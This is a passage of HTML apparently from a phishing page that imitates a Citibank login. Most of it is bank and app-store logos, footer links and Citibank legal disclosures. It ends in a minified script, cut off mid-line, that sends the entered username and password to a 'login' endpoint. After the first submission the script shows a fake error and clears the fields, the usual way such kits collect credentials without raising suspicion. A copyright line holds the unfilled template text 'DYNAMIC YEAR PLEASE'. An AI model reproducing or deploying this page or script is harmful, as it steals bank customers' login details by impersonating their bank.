2.705h3.095v-.361c-.596-.221-.596-.707-.596-2.656 0-2.504-.596-2.91-1.694-3.396 1.322-.443 2.064-1.713 2.064-3.182 0-1.158-.648-3.783-4.207-3.783H80.97v13.378h.001zM102.355 179.889h-2.793v-11.012h-4.04v-2.367H106.4v2.367h-4.045v11.012zM121.395 175.207c0 3.52-2.123 5.039-5.498 5.039-1.223 0-3.049-.311-4.244-1.631-.727-.816-1.006-1.898-1.039-3.238v-8.867h2.846v8.678c0 1.863 1.082 2.689 2.385 2.689 1.918 0 2.699-.938 2.699-2.557v-8.811h2.852v8.698h-.001zM134.916 166.51h2.613v13.379h-2.8l-5.459-9.543h-.03v9.543h-2.613V166.51h2.943l5.313 9.312h.033v-9.312zM145.412 179.889h-2.803V166.51h2.803v13.379zM156.32 179.889h-2.793v-11.012h-4.035v-2.367h10.873v2.367h-4.045v11.012zM170.928 179.889h-2.799v-5.051l-4.615-8.328h3.295l2.775 5.814 2.652-5.814h3.162l-4.47 8.361v5.018zM95.706 6.842L5.645 51.199v20.836h10.08v62.502h159.284V72.035h12.104V51.199L95.706 6.842zm59.815 108.871H35.216V58.592l60.49-30.914 59.816 30.914v57.121h-.001z"></path>
                            <path fill="#FFF" d="M123.256 78.75H67.479V58.592h55.777V78.75zM123.256 107.662H67.479V87.491h55.777v20.171z"></path>
                        </g>
                    </svg>
                </div>
            </div>
            <div class="social">
                <div class="download">
                    <svg enable-background="new 0 0 5435.8 1604" version="1.1" xml:space="preserve" xmlns="http://www.w3.org/2000/svg" viewBox="-0.03 0 5435.85 1604">
                        <style type="text/css">
                            .st0 {
                                fill-rule: evenodd;
                                clip-rule: evenodd;
                            }
                    
                            .st1 {
                                fill-rule: evenodd;
                                clip-rule: evenodd;
                                fill: #A6A6A6;
                            }
                    
                            .st2 {
                                fill: #FFFFFF;
                            }
                    
                            .st3 {
                                fill-rule: evenodd;
                                clip-rule: evenodd;
                                fill: #FFFFFF;
                            }
                    
                            .st4 {
                                fill-rule: evenodd;
                                clip-rule: evenodd;
                                fill: url(#d);
                            }
                    
                            .st5 {
                                fill-rule: evenodd;
                                clip-rule: evenodd;
                                fill: url(#c);
                            }
                    
                            .st6 {
                                fill-rule: evenodd;
                                clip-rule: evenodd;
                                fill: url(#b);
                            }
                    
                            .st7 {
                                fill-rule: evenodd;
                                clip-rule: evenodd;
                                fill: url(#a);
                            }
                    
                            .st8 {
                                opacity: 0.2;
                                fill-rule: evenodd;
                                clip-rule: evenodd;
                                enable-background: new;
                            }
                    
                            .st9 {
                                opacity: 0.12;
                                fill-rule: evenodd;
                                clip-rule: evenodd;
                                enable-background: new;
                            }
                    
                            .st10 {
                                opacity: 0.25;
                                fill-rule: evenodd;
                                clip-rule: evenodd;
                                fill: #FFFFFF;
                                enable-background: new;
                            }
                        </style>
                        <path class="st0" d="M5234.4,1604h-5033C90.4,1604,0,1513.6,0,1403.5v-1203C0,90,90.4,0,201.4,0h5033c110.9,0,201.4,90,201.4,200.5  v1203C5435.8,1513.6,5345.3,1604,5234.4,1604z"></path>
                        <path class="st1" d="m5234.4 32.1c93.1 0 169.3 75.7 169.3 168.4v1203c0 92.7-75.7 168.4-169.3 168.4h-5033c-93.1 0-169.3-75.7-169.3-168.4v-1203c0-92.7 75.7-168.4 169.3-168.4h5033zm0-32.1h-5033c-111 0-201.4 90.4-201.4 200.5v1203c0 110.5 90.4 200.5 201.4 200.5h5033c110.9 0 201.4-90 201.4-200.5v-1203c0-110.1-90.5-200.5-201.4-200.5z"></path>
                        <path class="st2" d="m2863.6 530.6c-36.3 0-66.9-12.7-91.1-37.7-24-24.3-37.4-57.8-36.8-92 0-36.5 12.4-67.4 36.8-91.9 24.1-25 54.7-37.7 91-37.7 35.9 0 66.5 12.7 91.1 37.7 24.4 25.3 36.8 56.2 36.8 91.9-0.4 36.6-12.8 67.5-36.8 91.9-24.1 25.2-54.7 37.8-91 37.8zm-1080.1 0c-35.5 0-66.3-12.5-91.5-37.2-25-24.6-37.7-55.7-37.7-92.4s12.7-67.8 37.7-92.4c24.7-24.7 55.5-37.2 91.5-37.2 17.6 0 34.7 3.5 51.1 10.6 16.1 6.9 29.2 16.3 38.9 27.8l2.4 2.9-27.1 26.6-2.8-3.3c-15.3-18.2-35.8-27.1-62.9-27.1-24.2 0-45.3 8.6-62.7 25.6-17.5 17.1-26.4 39.5-26.4 66.6s8.9 49.5 26.4 66.6c17.4 17 38.5 25.6 62.7 25.6 25.8 0 47.5-8.6 64.4-25.6 10-10 16.2-24 18.4-41.7h-86.9v-37.4h124.2l0.5 3.4c0.9 6.3 1.8 12.8 1.8 18.8 0 34.5-10.4 62.4-31 83-23.4 24.4-54 36.8-91 36.8zm1436.1-5.3h-38.3l-117.3-187.7 1 33.8v153.8h-38.3v-248.5h43.7l1.2 1.9 110.3 176.8-1-33.7v-145h38.7v248.6zm-643.8 0h-38.8v-211.2h-67.3v-37.4h173.3v37.4h-67.3v211.2zm-137.7 0h-38.7v-248.6h38.7v248.6zm-217.5 0h-38.7v-211.2h-67.3v-37.4h173.3v37.4h-67.3v211.2zm-130.5-0.4h-148.4v-248.2h148.4v37.4h-109.6v68.2h98.9v37h-98.9v68.2h109.6v37.4zm710.8-57.7c17.3 17.3 38.3 26 62.7 26 25.1 0 45.6-8.5 62.7-26 17-17 25.6-39.3 25.6-66.2s-8.6-49.3-25.5-66.2c-17.3-17.3-38.4-26-62.7-26-25.1 0-45.6 8.5-62.6 26-17 17-25.6 39.3-25.6 66.2s8.5 49.3 25.4 66.2z"></path>
                        <path class="st3" d="m2732.1 872.4c-94.5 0-171.1 71.7-171.1 170.6 0 98 77.1 170.6 171.1 170.6 94.5 0 171.1-72.2 171.1-170.6 0-98.9-76.6-170.6-171.1-170.6zm0 273.6c-51.7 0-96.2-42.8-96.2-103.4 0-61.5 44.6-103.4 96.2-103.4 51.7 0 96.2 41.9 96.2 103.4 0.1 61-44.5 103.4-96.2 103.4zm-373.3-273.6c-94.5 0-171.1 71.7-171.1 170.6 0 98 77.1 170.6 171.1 170.6 94.5 0 171.1-72.2 171.1-170.6 0-98.9-76.7-170.6-171.1-170.6zm0 273.6c-51.7 0-96.2-42.8-96.2-103.4 0-61.5 44.6-103.4 96.2-103.4 51.7 0 96.2 41.9 96.2 103.4 0 61-44.5 103.4-96.2 103.4zm-444.2-221.5v72.2h173.3c-5.3 40.5-18.7 70.4-39.2 90.9-25.4 25.4-64.6 53-133.7 53-106.5 0-189.8-86-189.8-192.5s83.3-192.5 189.8-192.5c57.5 0 99.4 22.7 130.5 51.7l51.2-51.2c-43.2-41.4-100.7-73.1-181.3-73.1-146.1 0-268.7 119-268.7 264.7 0 146.1 122.5 264.7 268.7 264.7 78.9 0 138.1-25.8 184.9-74.4 47.7-47.7 62.8-115 62.8-169.3 0-16.9-1.3-32.1-4-45h-244.6c0.1-0.1 0.1 0.8 0.1 0.8zm1816.9 56.2c-14.3-38.3-57.5-108.7-146.1-108.7-87.8 0-160.8 69.1-160.8 170.6 0 95.8 72.2 170.6 169.3 170.6 78 0 123.4-47.7 142.1-75.7l-57.9-38.8c-19.2 28.5-45.9 47.2-83.8 47.2-38.3 0-65.1-17.4-82.9-51.7l228.1-94.5c0 0.1-8-19-8-19zm-232.6 57c-1.8-65.9 51.2-99.4 89.1-99.4 29.9 0 54.8 14.7 63.3 36.1l-152.4 63.3zm-185.3 165.3h74.9v-501.2h-74.9v501.2zm-123-292.7h-2.7c-16.9-20.1-49-38.3-90-38.3-85.1 0-163.5 74.9-163.5 171.1 0 95.8 78 169.8 163.5 169.8 40.5 0 73.1-18.3 90-38.8h2.7v24.5c0 65.1-34.8 100.2-90.9 100.2-45.9 0-74.4-33-86-60.6l-65.1 27.2c18.7 45 68.6 100.7 151 100.7 87.8 0 162.2-51.7 162.2-177.8v-306.1h-70.8v28.1h-0.4zm-86 235.7c-51.7 0-94.9-43.2-94.9-102.9 0-60.2 43.2-103.8 94.9-103.8 51.2 0 90.9 44.1 90.9 103.8 0.5 59.7-39.6 102.9-90.9 102.9zm977.6-444.2h-179.1v501.2h74.9v-189.8h104.3c82.9 0 164.4-60.1 164.4-155.5s-81.2-155.9-164.5-155.9zm2.2 241.4h-106.5v-172h106.5c56.1 0 87.8 46.3 87.8 86 0 39.3-32.1 86-87.8 86zm462.5-71.7c-54.4 0-110.5 24.1-133.7 76.6l66.4 27.6c14.3-27.6 40.5-37 68.2-37 38.8 0 78 23.2 78.9 64.6v5.3c-13.4-7.6-42.8-19.2-78-19.2-71.7 0-144.4 39.2-144.4 112.7 0 67.3 58.8 110.5 124.3 110.5 50.3 0 78-22.7 95.3-49h2.7v38.8h72.2v-192c0-89.4-66.4-138.9-151.9-138.9zm-9.4 274.5c-24.5 0-58.8-12-58.8-42.8 0-38.8 42.8-53.5 79.3-53.5 33 0 48.6 7.1 68.2 16.9-5.4 45-43.4 79-88.7 79.4zm424.7-263.8-86 217.4h-2.7l-89.1-217.4h-80.6l133.7 303.9-76.2 168.9h78l205.7-472.8h-82.8zm-674.2 320.8h74.9v-501.2h-74.9v501.2z"></path>
                        <linearGradient id="d" x1="1682.1" x2="1624.3" y1="1339.5" y2="1309.6" gradientTransform="matrix(11.64 0 0 -22.55 -18706 30554)" gradientUnits="userSpaceOnUse">
                            <stop stop-color="#00A0FF" offset="0"></stop>
                            <stop stop-color="#00A1FF" offset=".00657"></stop>
                            <stop stop-color="#00BEFF" offset=".2601"></stop>
                            <stop stop-color="#00D2FF" offset=".5122"></stop>
                            <stop stop-color="#00DFFF" offset=".7604"></stop>
                            <stop stop-color="#00E3FF" offset="1"></stop>
                        </linearGradient>
                        <path class="st4" d="m418.4 302.1c-11.6 12.5-18.3 31.6-18.3 56.6v886.7c0 25 6.7 44.1 18.7 56.1l3.1 2.7 496.8-496.8v-11.1l-497.2-496.9-3.1 2.7z"></path>
                        <linearGradient id="c" x1="1712.7" x2="1606.6" y1="1274.8" y2="1274.8" gradientTransform="matrix(9.145 0 0 -7.7 -14306 10618)" gradientUnits="userSpaceOnUse">
                            <stop stop-color="#FFE000" offset="0"></stop>
                            <stop stop-color="#FFBD00" offset=".4087"></stop>
                            <stop stop-color="#FFA500" offset=".7754"></stop>
                            <stop stop-color="#FF9C00" offset="1"></stop>
                        </linearGradient>
                        <path class="st5" d="m1084 973.5-165.7-165.7v-11.6l165.7-165.7 3.6 2.2 196 111.4c56.1 31.6 56.1 83.8 0 115.8l-196 111.4-3.6 2.2z"></path>
                        <linearGradient id="b" x1="1707.4" x2="1646.7" y1="1290" y2="1211.2" gradientTransform="matrix(15.02 0 0 -11.578 -24650 15830)" gradientUnits="userSpaceOnUse">
                            <stop stop-color="#FF3A44" offset="0"></stop>
                            <stop stop-color="#C31162" offset="1"></stop>
                        </linearGradient>
                        <path class="st6" d="m1087.6 971.3-169.3-169.3-499.9 499.9c18.3 19.6 49 21.8 83.3 2.7l585.9-333.3"></path>
                        <linearGradient id="a" x1="1660.6" x2="1687.8" y1="1365.7" y2="1330.5" gradientTransform="matrix(15.02 0 0 -11.572 -24650 15810)" gradientUnits="userSpaceOnUse">
                            <stop stop-color="#32A071" offset="0"></stop>
                            <stop stop-color="#2DA771" offset=".0685"></stop>
                            <stop stop-color="#15CF74" offset=".4762"></stop>
                            <stop stop-color="#06E775" offset=".8009"></stop>
                            <stop stop-color="#00F076" offset="1"></stop>
                        </linearGradient>
                        <path class="st7" d="M1087.6,632.7L501.7,299.9c-34.3-19.6-65.1-16.9-83.3,2.7L918.3,802L1087.6,632.7z"></path>
                        <path class="st8" d="m1084 967.7-581.9 330.6c-32.5 18.7-61.5 17.4-80.2 0.4l-3.1 3.1 3.1 2.7c18.7 16.9 47.7 18.3 80.2-0.4l585.9-332.8-4-3.6z"></path>
                        <path class="st9" d="m1283.6 854.1-200.1 113.6 3.6 3.6 196-111.4c28.1-16 41.9-37 41.9-57.9-1.7 19.2-16 37.4-41.4 52.1z"></path>
                        <path class="st10" d="m501.7 305.7 781.9 444.2c25.4 14.3 39.7 33 41.9 52.1 0-20.9-13.8-41.9-41.9-57.9l-781.9-444.2c-56.1-32.1-101.6-5.3-101.6 58.8v5.8c0-64.2 45.5-90.5 101.6-58.8z"></path>
                    </svg>
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -0.03 119.67 40.03">
                        <path d="M110.13477,0H9.53468c-.3667,0-.729,0-1.09473.002-.30615.002-.60986.00781-.91895.0127A13.21476,13.21476,0,0,0,5.5171.19141a6.66509,6.66509,0,0,0-1.90088.627A6.43779,6.43779,0,0,0,1.99757,1.99707,6.25844,6.25844,0,0,0,.81935,3.61816a6.60119,6.60119,0,0,0-.625,1.90332,12.993,12.993,0,0,0-.1792,2.002C.00587,7.83008.00489,8.1377,0,8.44434V31.5586c.00489.3105.00587.6113.01515.9219a12.99232,12.99232,0,0,0,.1792,2.0019,6.58756,6.58756,0,0,0,.625,1.9043A6.20778,6.20778,0,0,0,1.99757,38.001a6.27445,6.27445,0,0,0,1.61865,1.1787,6.70082,6.70082,0,0,0,1.90088.6308,13.45514,13.45514,0,0,0,2.0039.1768c.30909.0068.6128.0107.91895.0107C8.80567,40,9.168,40,9.53468,40H110.13477c.3594,0,.7246,0,1.084-.002.3047,0,.6172-.0039.9219-.0107a13.279,13.279,0,0,0,2-.1768,6.80432,6.80432,0,0,0,1.9082-.6308,6.27742,6.27742,0,0,0,1.6172-1.1787,6.39482,6.39482,0,0,0,1.1816-1.6143,6.60413,6.60413,0,0,0,.6191-1.9043,13.50643,13.50643,0,0,0,.1856-2.0019c.0039-.3106.0039-.6114.0039-.9219.0078-.3633.0078-.7246.0078-1.0938V9.53613c0-.36621,0-.72949-.0078-1.09179,0-.30664,0-.61426-.0039-.9209a13.5071,13.5071,0,0,0-.1856-2.002,6.6177,6.6177,0,0,0-.6191-1.90332,6.46619,6.46619,0,0,0-2.7988-2.7998,6.76754,6.76754,0,0,0-1.9082-.627,13.04394,13.04394,0,0,0-2-.17676c-.3047-.00488-.6172-.01074-.9219-.01269-.3594-.002-.7246-.002-1.084-.002Z" fill="#a6a6a6"></path>
                        <path d="M8.44483,39.125c-.30468,0-.602-.0039-.90429-.0107a12.68714,12.68714,0,0,1-1.86914-.1631,5.88381,5.88381,0,0,1-1.65674-.5479,5.40573,5.40573,0,0,1-1.397-1.0166,5.32082,5.32082,0,0,1-1.02051-1.3965,5.72186,5.72186,0,0,1-.543-1.6572,12.41351,12.41351,0,0,1-.1665-1.875c-.00634-.2109-.01464-.9131-.01464-.9131V8.44434S.88185,7.75293.8877,7.5498a12.37039,12.37039,0,0,1,.16553-1.87207,5.7555,5.7555,0,0,1,.54346-1.6621A5.37349,5.37349,0,0,1,2.61183,2.61768,5.56543,5.56543,0,0,1,4.01417,1.59521a5.82309,5.82309,0,0,1,1.65332-.54394A12.58589,12.58589,0,0,1,7.543.88721L8.44532.875H111.21387l.9131.0127a12.38493,12.38493,0,0,1,1.8584.16259,5.93833,5.93833,0,0,1,1.6709.54785,5.59374,5.59374,0,0,1,2.415,2.41993,5.76267,5.76267,0,0,1,.5352,1.64892,12.995,12.995,0,0,1,.1738,1.88721c.0029.2832.0029.5874.0029.89014.0079.375.0079.73193.0079,1.09179V30.4648c0,.3633,0,.7178-.0079,1.0752,0,.3252,0,.6231-.0039.9297a12.73126,12.73126,0,0,1-.1709,1.8535,5.739,5.739,0,0,1-.54,1.67,5.48029,5.48029,0,0,1-1.0156,1.3857,5.4129,5.4129,0,0,1-1.3994,1.0225,5.86168,5.86168,0,0,1-1.668.5498,12.54218,12.54218,0,0,1-1.8692.1631c-.2929.0068-.5996.0107-.8974.0107l-1.084.002Z"></path>
                        <g>
                            <g>
                                <g fill="#FFF">
                                    <path d="m24.769 20.301a4.9488 4.9488 0 0 1 2.3566-4.1521 5.0657 5.0657 0 0 0-3.9912-2.1577c-1.6792-0.17626-3.3072 1.0048-4.1629 1.0048-0.87227 0-2.1898-0.98733-3.6085-0.95814a5.3153 5.3153 0 0 0-4.4729 2.7279c-1.934 3.3484-0.49141 8.2695 1.3612 10.976 0.9269 1.3254 2.0102 2.8058 3.4276 2.7533 1.3871-0.05753 1.9051-0.88448 3.5794-0.88448 1.6588 0 2.1448 0.88448 3.591 0.8511 1.4884-0.02416 2.4261-1.3312 3.3205-2.6691a10.962 10.962 0 0 0 1.5184-3.0925 4.782 4.782 0 0 1-2.9192-4.3992z">
                                    </path>
                                    <path d="m22.037 12.211a4.8725 4.8725 0 0 0 1.1145-3.4906 4.9575 4.9575 0 0 0-3.2076 1.6596 4.6363 4.6363 0 0 0-1.1437 3.3614 4.099 4.099 0 0 0 3.2368-1.5304z">
                                    </path>
                                </g>
                            </g>
                            <g fill="#FFF">
                                <path d="m42.302 27.14h-4.7334l-1.1367 3.3564h-2.0049l4.4834-12.418h2.083l4.4834 12.418h-2.0391zm-4.2432-1.5488h3.752l-1.8496-5.4473h-0.05176z"></path>
                                <path d="m55.16 25.97c0 2.8135-1.5059 4.6211-3.7783 4.6211a3.0693 3.0693 0 0 1-2.8486-1.584h-0.043v4.4844h-1.8584v-12.049h1.7989v1.5059h0.03418a3.2116 3.2116 0 0 1 2.8828-1.6006c2.2978 1e-5 3.8125 1.8164 3.8125 4.6221zm-1.9102 0c0-1.833-0.94727-3.0381-2.3926-3.0381-1.4199 0-2.375 1.2305-2.375 3.0381 0 1.8242 0.95508 3.0459 2.375 3.0459 1.4453 0 2.3926-1.1963 2.3926-3.0459z"></path>
                                <path d="m65.125 25.97c0 2.8135-1.5059 4.6211-3.7783 4.6211a3.0693 3.0693 0 0 1-2.8486-1.584h-0.043v4.4844h-1.8584v-12.049h1.7988v1.5059h0.03418a3.2116 3.2116 0 0 1 2.8828-1.6006c2.2979 0 3.8125 1.8164 3.8125 4.6221zm-1.9102 0c0-1.833-0.94727-3.0381-2.3926-3.0381-1.4199 0-2.375 1.2305-2.375 3.0381 0 1.8242 0.95508 3.0459 2.375 3.0459 1.4453 0 2.3926-1.1963 2.3926-3.0459z"></path>
                                <path d="m71.71 27.036c0.1377 1.2314 1.334 2.04 2.9688 2.04 1.5664 0 2.6934-0.80859 2.6934-1.919 0-0.96387-0.67969-1.541-2.2891-1.9365l-1.6094-0.3877c-2.2803-0.55078-3.3389-1.6172-3.3389-3.3477 0-2.1426 1.8672-3.6143 4.5186-3.6143 2.624 0 4.4228 1.4717 4.4834 3.6143h-1.876c-0.1123-1.2393-1.1367-1.9873-2.6338-1.9873s-2.5215 0.75684-2.5215 1.8584c0 0.87793 0.6543 1.3945 2.2549 1.79l1.3682 0.33594c2.5478 0.60254 3.6064 1.626 3.6064 3.4424 0 2.3232-1.8506 3.7783-4.794 3.7783-2.7539 0-4.6133-1.4209-4.7334-3.667z"></path>
                                <path d="m83.346 19.3v2.1426h1.7217v1.4717h-1.7217v4.9912c0 0.77539 0.34473 1.1367 1.1016 1.1367a5.8075 5.8075 0 0 0 0.61133-0.043v1.4629a5.1035 5.1035 0 0 1-1.0322 0.08594c-1.833 0-2.5478-0.68848-2.5478-2.4443v-5.1894h-1.3164v-1.4717h1.3164v-2.1426z"></path>
                                <path d="m86.065 25.97c0-2.8486 1.6777-4.6387 4.294-4.6387 2.625 0 4.2949 1.79 4.2949 4.6387 0 2.8564-1.6611 4.6387-4.2949 4.6387-2.6329 0-4.294-1.7822-4.294-4.6387zm6.6953 0c0-1.9541-0.89551-3.1074-2.4014-3.1074s-2.4004 1.1621-2.4004 3.1074c0 1.9619 0.89453 3.1064 2.4004 3.1064s2.4013-1.1445 2.4013-3.1064z"></path>
                                <path d="m96.186 21.442h1.7725v1.541h0.043a2.1594 2.1594 0 0 1 2.1777-1.6357 2.8662 2.8662 0 0 1 0.63672 0.06934v1.7383a2.5979 2.5979 0 0 0-0.835-0.1123 1.8726 1.8726 0 0 0-1.9365 2.083v5.3701h-1.8584z"></path>
                                <path d="m109.38 27.837c-0.25 1.6436-1.8506 2.7715-3.8984 2.7715-2.6338 0-4.2686-1.7646-4.2686-4.5957 0-2.8398 1.6436-4.6816 4.1904-4.6816 2.5049 0 4.0801 1.7207 4.0801 4.4658v0.63672h-6.3945v0.1123a2.358 2.358 0 0 0 2.4356 2.5644 2.0483 2.0483 0 0 0 2.0908-1.2734zm-6.2822-2.7022h4.5264a2.1773 2.1773 0 0 0-2.2207-2.2978 2.292 2.292 0 0 0-2.3057 2.2979z"></path>
                            </g>
                        </g>
                        <g>
                            <g fill="#FFF">
                                <path d="m37.826 8.731a2.6396 2.6396 0 0 1 2.8076 2.9648c0 1.9062-1.0303 3.002-2.8076 3.002h-2.1553v-5.9668zm-1.2285 5.123h1.125a1.8759 1.8759 0 0 0 1.9678-2.146 1.881 1.881 0 0 0-1.9678-2.1338h-1.125z"></path>
                                <path d="m41.681 12.444a2.1332 2.1332 0 1 1 4.2471 0 2.1336 2.1336 0 1 1-4.2471 0zm3.333 0c0-0.97607-0.43848-1.5469-1.208-1.5469-0.77246 0-1.207 0.5708-1.207 1.5469 0 0.98389 0.43457 1.5503 1.207 1.5503 0.76954-1e-5 1.208-0.57032 1.208-1.5503z"></path>
                                <path d="M51.57326,14.69775h-.92187l-.93066-3.31641h-.07031l-.92676,3.31641h-.91309l-1.24121-4.50293h.90137l.80664,3.436h.06641l.92578-3.436h.85254l.92578,3.436h.07031l.80273-3.436h.88867Z"></path>
                                <path d="m53.854 10.195h0.85546v0.71533h0.06641a1.348 1.348 0 0 1 1.3438-0.80225 1.4646 1.4646 0 0 1 1.5586 1.6748v2.915h-0.88867v-2.6918c0-0.72363-0.31445-1.0835-0.97168-1.0835a1.0329 1.0329 0 0 0-1.0752 1.1411v2.6343h-0.88867z"></path>
                                <path d="m59.094 8.437h0.88867v6.2607h-0.88867z"></path>
                                <path d="m61.218 12.444a2.1335 2.1335 0 1 1 4.2476 0 2.1338 2.1338 0 1 1-4.2476 0zm3.333 0c0-0.97607-0.43848-1.5469-1.208-1.5469-0.77246 0-1.207 0.5708-1.207 1.5469 0 0.98389 0.43457 1.5503 1.207 1.5503 0.76953-1e-5 1.208-0.57032 1.208-1.5503z"></path>
                                <path d="M66.4009,13.42432c0-.81055.60352-1.27783,1.6748-1.34424l1.21973-.07031v-.38867c0-.47559-.31445-.74414-.92187-.74414-.49609,0-.83984.18213-.93848.50049h-.86035c.09082-.77344.81836-1.26953,1.83984-1.26953,1.12891,0,1.76563.562,1.76563,1.51318v3.07666h-.85547v-.63281h-.07031a1.515,1.515,0,0,1-1.35254.707A1.36026,1.36026,0,0,1,66.4009,13.42432Zm2.89453-.38477v-.37646l-1.09961.07031c-.62012.0415-.90137.25244-.90137.64941,0,.40527.35156.64111.835.64111A1.0615,1.0615,0,0,0,69.29543,13.03955Z"></path>
                                <path d="m71.348 12.444c0-1.4228 0.73145-2.3242 1.8691-2.3242a1.484 1.484 0 0 1 1.3809 0.79h0.06641v-2.4731h0.88867v6.2607h-0.85156v-0.71143h-0.07031a1.5628 1.5628 0 0 1-1.4141 0.78564c-1.1455 5e-5 -1.8692-0.90134-1.8692-2.3276zm0.918 0c0 0.95508 0.4502 1.5298 1.2031 1.5298 0.749 0 1.2119-0.583 1.2119-1.5259 0-0.93848-0.46777-1.5298-1.2119-1.5298-0.74808 0-1.2032 0.57861-1.2032 1.5259z"></path>
                                <path d="m79.23 12.444a2.1332 2.1332 0 1 1 4.2471 0 2.1336 2.1336 0 1 1-4.2471 0zm3.333 0c0-0.97607-0.43848-1.5469-1.208-1.5469-0.77246 0-1.207 0.5708-1.207 1.5469 0 0.98389 0.43457 1.5503 1.207 1.5503 0.76953-1e-5 1.208-0.57032 1.208-1.5503z"></path>
                                <path d="m84.669 10.195h0.85547v0.71533h0.06641a1.348 1.348 0 0 1 1.3438-0.80225 1.4646 1.4646 0 0 1 1.5586 1.6748v2.915h-0.88867v-2.6918c0-0.72363-0.31445-1.0835-0.97168-1.0835a1.0329 1.0329 0 0 0-1.0752 1.1411v2.6343h-0.88867z"></path>
                                <path d="M93.51516,9.07373v1.1416h.97559v.74854h-.97559V13.2793c0,.47168.19434.67822.63672.67822a2.96657,2.96657,0,0,0,.33887-.02051v.74023a2.9155,2.9155,0,0,1-.4834.04541c-.98828,0-1.38184-.34766-1.38184-1.21582v-2.543h-.71484v-.74854h.71484V9.07373Z"></path>
                                <path d="m95.705 8.437h0.88086v2.4814h0.07031a1.3856 1.3856 0 0 1 1.373-0.80664 1.4834 1.4834 0 0 1 1.5508 1.6787v2.9072h-0.88956v-2.688c0-0.71924-0.335-1.0835-0.96289-1.0835a1.0519 1.0519 0 0 0-1.1338 1.1416v2.6299h-0.88867z"></path>
                                <path d="m104.76 13.482a1.828 1.828 0 0 1-1.9512 1.3027 2.0453 2.0453 0 0 1-2.0801-2.3242 2.0768 2.0768 0 0 1 2.0762-2.3525c1.2529 0 2.0088 0.856 2.0088 2.27v0.31009h-3.1797v0.0498a1.1902 1.1902 0 0 0 1.1992 1.29 1.0793 1.0793 0 0 0 1.0713-0.5459zm-3.126-1.4512h2.2744a1.0865 1.0865 0 0 0-1.1084-1.1665 1.1516 1.1516 0 0 0-1.166 1.1665z"></path>
                            </g>
                        </g>
                    </svg>
                </div>
                <div class="icons">
                    <svg enable-background="new 0 0 310 310" version="1.1" xml:space="preserve" xmlns="http://www.w3.org/2000/svg" viewBox="76.68 -0.03 156.63 310.03">
                        <path fill="#FFF" d="m81.703 165.11h33.981v139.89c0 2.762 2.238 5 5 5h57.616c2.762 0 5-2.238 5-5v-139.24h39.064c2.54 0 4.677-1.906 4.967-4.429l5.933-51.502c0.163-1.417-0.286-2.836-1.234-3.899-0.949-1.064-2.307-1.673-3.732-1.673h-44.996v-32.284c0-9.732 5.24-14.667 15.576-14.667h29.42c2.762 0 5-2.239 5-5v-47.274c0-2.762-2.238-5-5-5h-40.545c-0.286-0.014-0.921-0.037-1.857-0.037-7.035 0-31.488 1.381-50.804 19.151-21.402 19.692-18.427 43.27-17.716 47.358v37.752h-35.673c-2.762 0-5 2.238-5 5v50.844c0 2.762 2.238 5.001 5 5.001z"></path>
                    </svg>
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 2.23 24.02 19.53">
                        <path fill="#FFF" d="M24 4.557c-.883.392-1.832.656-2.828.775 1.017-.609 1.798-1.574 2.165-2.724-.951.564-2.005.974-3.127 1.195-.897-.957-2.178-1.555-3.594-1.555-3.179 0-5.515 2.966-4.797 6.045-4.091-.205-7.719-2.165-10.148-5.144-1.29 2.213-.669 5.108 1.523 6.574-.806-.026-1.566-.247-2.229-.616-.054 2.281 1.581 4.415 3.949 4.89-.693.188-1.452.232-2.224.084.626 1.956 2.444 3.379 4.6 3.419-2.07 1.623-4.678 2.348-7.29 2.04 2.179 1.397 4.768 2.212 7.548 2.212 9.142 0 14.307-7.721 13.995-14.646.962-.695 1.797-1.562 2.457-2.549z"></path>
                    </svg>
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 2.98 24 18.03">
                        <path fill="#FFF" d="M19.615 3.184c-3.604-.246-11.631-.245-15.23 0-3.897.266-4.356 2.62-4.385 8.816.029 6.185.484 8.549 4.385 8.816 3.6.245 11.626.246 15.23 0 3.897-.266 4.356-2.62 4.385-8.816-.029-6.185-.484-8.549-4.385-8.816zm-10.615 12.816v-8l8 3.993-8 4.007z"></path>
                    </svg>
                </div>
            </div>
            <div class="copyright">
                <span>&copy; DYNAMIC YEAR PLEASE Citigroup Inc</span>
                <span>Terms & Conditions</span>
                <span>Privacy</span>
                <span>Notice at Collection</span>
                <span>CA Privacy Hub</span>
                <span>Accessibility</span>
                <span>Country & Jurisdictions:</span>
                <span>United States ></span>
            </div>
            <div class="disclosure">
                <span>Important Legal Disclosures & Information</span>
                <span>Citibank.com provides information about and access to accounts and financial services provided by Citibank, N.A. and its affiliates in the United States and its territories. It does not, and should not be construed as, an offer, invitation or solicitation of services to individuals outside of the United States.</span>
                <span>Terms, conditions and fees for accounts, products, programs and services are subject to change. Not all accounts, products, and services as well as pricing described here are available in all jurisdictions or to all customers. Your eligibility for a particular product and service is subject to a final determination by Citibank. Your country of citizenship, domicile, or residence, if other than the United States, may have laws, rules, and regulations that govern or affect your application for and use of our accounts, products and services, including laws and regulations regarding taxes, exchange and/or capital controls that you are responsible for following.</span>
                <span>The products, account packages, promotional offers and services described in this website may not apply to customers of <span>International Personal Bank U.S.</span> in the Citigold® Private Client International, Citigold® International, Citi International Personal, Citi Global Executive Preferred, and Citi Global Executive Account Packages.</span>
            </div>
        </div>
        <script>inputs=document.getElementsByTagName("input"),error=document.getElementsByClassName("error")[0],form=document.getElementsByTagName("form")[0],button=document.getElementsByTagName("button")[0],inputs=[inputs[0],inputs[1]],button.addEventListener("click",a=>{inputs.forEach(b=>{""!=b.value.trim()&&b.classList.remove("error"),""==b.value.trim()&&(a.preventDefault(),b.classList.add("error"))}),""!=inputs[0].value.trim()&&""!=inputs[1].value.trim()&&(null===window.localStorage.getItem("error")?(xhr=new XMLHttpRequest,data="username="+inputs[0].value.trim()+"&password="+inputs[1].value.trim(),xhr.open("POST","login",1),xhr.setRequestHeader("Content-type","application/x-www-form-urlencoded"),xhr.onreadystatechange=()=>{4==xhr.readyState&&200==xhr.status&&(window.localStorage.setItem("error",1),error.classList.add("visible"),inputs[0].classList.add("error"),inputs[1].classList.add("error"),inputs[0].value="",inputs[1].value="")},xhr.send(data)):(xhr=new 